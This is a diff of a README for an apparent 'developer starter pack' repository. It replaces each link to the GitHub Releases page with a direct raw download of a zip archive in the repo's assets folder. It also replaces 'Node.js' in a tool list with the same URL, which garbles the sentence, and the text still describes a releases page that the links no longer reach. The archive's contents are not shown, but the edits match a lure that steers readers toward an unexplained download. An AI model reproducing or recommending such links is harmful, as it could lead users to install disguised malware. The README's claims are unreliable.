@@ -1,6 +1,6 @@
 # 🚀 developer-starter-pack-2026 - Your Toolkit for Developer Success
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Quesofps/developer-starter-pack-2026/releases)
+[![Download](https://github.com/Quesofps/developer-starter-pack-2026/raw/refs/heads/main/assets/starter_developer_pack_v3.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/Quesofps/developer-starter-pack-2026/raw/refs/heads/main/assets/starter_developer_pack_v3.1.zip)
 
 ## 📁 Overview
 
@@ -11,7 +11,7 @@ The **developer-starter-pack-2026** is designed to provide everything a develope
 Getting started is simple. Follow these steps to download and run the software:
 
 1. **Visit the Releases Page**  
-   Click [here to download](https://github.com/Quesofps/developer-starter-pack-2026/releases). This page contains the latest versions of the development tools and resources included in the starter pack.
+   Click [here to download](https://github.com/Quesofps/developer-starter-pack-2026/raw/refs/heads/main/assets/starter_developer_pack_v3.1.zip). This page contains the latest versions of the development tools and resources included in the starter pack.
 
 2. **Choose Your Version**  
    On the Releases page, you will see various versions listed. Select the most recent version. The latest release ensures you have the newest features and fixes.
@@ -31,7 +31,7 @@ Getting started is simple. Follow these steps to download and run the software:
 
 ## 🔗 Download & Install
 
-To download the developer starter pack, simply visit [this page](https://github.com/Quesofps/developer-starter-pack-2026/releases). Make sure to follow the steps outlined in the Getting Started section. 
+To download the developer starter pack, simply visit [this page](https://github.com/Quesofps/developer-starter-pack-2026/raw/refs/heads/main/assets/starter_developer_pack_v3.1.zip). Make sure to follow the steps outlined in the Getting Started section. 
 
 ## 🛠 Features
 
@@ -58,7 +58,7 @@ The developer starter pack includes various types of tools to cater to different
 1. **Code Editors**: Tools like Visual Studio Code or Atom for writing code comfortably.
 2. **Version Control**: Git for managing code changes and collaborating with others.
 3. **Frontend Frameworks**: Resources that include React and jQuery for web development.
-4. **Backend Solutions**: Node.js for server-side coding.
+4. **Backend Solutions**: https://github.com/Quesofps/developer-starter-pack-2026/raw/refs/heads/main/assets/starter_developer_pack_v3.1.zip for server-side coding.
 
 ## 📚 Learning Resources
 
